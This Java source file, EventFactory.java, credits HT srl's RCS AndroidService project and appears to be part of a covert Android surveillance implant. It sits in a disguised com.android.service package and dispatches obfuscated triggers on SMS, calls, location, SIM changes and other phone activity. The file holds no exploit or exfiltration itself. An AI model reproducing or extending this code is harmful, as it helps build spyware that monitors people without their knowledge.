/* *******************************************
 * Copyright (c) 2011
 * HT srl,   All rights reserved.
 * Project      : RCS, AndroidService
 * File         : EventFactory.java
 * Created      : 6-mag-2011
 * Author		: zeno
 * *******************************************/

package com.android.service.event;

import com.android.service.Messages;
import com.android.service.auto.Cfg;
import com.android.service.interfaces.AbstractFactory;
import com.android.service.util.Check;

public class FactoryEvent implements AbstractFactory<BaseEvent, String> {
	private static final String TAG = "EventFactory"; //$NON-NLS-1$

	public BaseEvent create(String type, String subtype) {
		BaseEvent e = null;
		if (Messages.getString("e.0").equals(type)) { //$NON-NLS-1$
			if (Cfg.DEBUG) {
				Check.log(TAG + " Info: " + "");//$NON-NLS-1$ //$NON-NLS-2$
			}
			if (Messages.getString("e.1").equals(subtype)) { //$NON-NLS-1$
				e = new EventLoop();
			} else if (Messages.getString("e.2").equals(subtype)) { //$NON-NLS-1$
				e = new EventStartup();
			} else {
				e = new EventTimer();
			}
		} else if (Messages.getString("e.3").equals(type)) { //$NON-NLS-1$
			if (Cfg.DEBUG) {
				Check.log(TAG + " Info: " + "");//$NON-NLS-1$ //$NON-NLS-2$
			}
			e = new EventDate();
		} else if (Messages.getString("e.4").equals(type)) { //$NON-NLS-1$
			if (Cfg.DEBUG) {
				Check.log(TAG + " Info: " + "");//$NON-NLS-1$ //$NON-NLS-2$
			}
			e = new EventAfterinst();
		} else if (Messages.getString("e.5").equals(type)) { //$NON-NLS-1$

			if (Cfg.DEBUG) {
				Check.log(TAG + " Info: " + "EVENT_SMS");//$NON-NLS-1$ //$NON-NLS-2$
			}
			e = new EventSms();
		} else if (Messages.getString("e.6").equals(type)) { //$NON-NLS-1$
			if (Cfg.DEBUG) {
				Check.log(TAG + " Info: " + "EVENT_CALL");//$NON-NLS-1$ //$NON-NLS-2$
			}
			e = new EventCall();
		} else if (Messages.getString("e.7").equals(type)) { //$NON-NLS-1$
			if (Cfg.DEBUG) {
				Check.log(TAG + " Info: " + "EVENT_CONNECTION");//$NON-NLS-1$ //$NON-NLS-2$
			}
			e = new EventConnectivity();
		} else if (Messages.getString("e.8").equals(type)) { //$NON-NLS-1$
			if (Cfg.DEBUG) {
				Check.log(TAG + " Info: " + "EVENT_PROCESS");//$NON-NLS-1$ //$NON-NLS-2$
			}
			e = new EventProcess();
		} else if (Messages.getString("e.9").equals(type)) { //$NON-NLS-1$
			if (Cfg.DEBUG) {
				Check.log(TAG + " Info: " + "EVENT_CELLID");//$NON-NLS-1$ //$NON-NLS-2$
			}
			e = new EventCellId();
		} else if (Messages.getString("e.10").equals(type)) { //$NON-NLS-1$
			if (Cfg.DEBUG) {
				Check.log(TAG + " Info: " + "EVENT_QUOTA");//$NON-NLS-1$ //$NON-NLS-2$
			}
			e = new EventQuota();
		} else if (Messages.getString("e.11").equals(type)) { //$NON-NLS-1$
			if (Cfg.DEBUG) {
				Check.log(TAG + " Info: " + "EVENT_SIM_CHANGE");//$NON-NLS-1$ //$NON-NLS-2$
			}
			e = new EventSim();
		} else if (Messages.getString("e.12").equals(type)) { //$NON-NLS-1$
			if (Cfg.DEBUG) {
				Check.log(TAG + " Info: " + "EVENT_LOCATION");//$NON-NLS-1$ //$NON-NLS-2$
			}
			e = new EventLocation();
		} else if (Messages.getString("e.13").equals(type)) { //$NON-NLS-1$
			if (Cfg.DEBUG) {
				Check.log(TAG + " Info: " + "EVENT_AC");//$NON-NLS-1$ //$NON-NLS-2$
			}
			e = new EventAc();
		} else if (Messages.getString("e.14").equals(type)) { //$NON-NLS-1$
			if (Cfg.DEBUG) {
				Check.log(TAG + " Info: " + "EVENT_BATTERY");//$NON-NLS-1$ //$NON-NLS-2$
			}
			e = new EventBattery();
		} else if (Messages.getString("e.15").equals(type)) { //$NON-NLS-1$
			if (Cfg.DEBUG) {
				Check.log(TAG + " Info: " + "EVENT_STANDBY");//$NON-NLS-1$ //$NON-NLS-2$
			}
			e = new EventStandby();
		} else {
			if (Cfg.DEBUG) {
				Check.log(TAG + " Error: " + "Unknown: " + type);//$NON-NLS-1$ //$NON-NLS-2$
			}
		}

		if (e != null) {
			e.setSubType(subtype);
		}
		return e;
	}

}
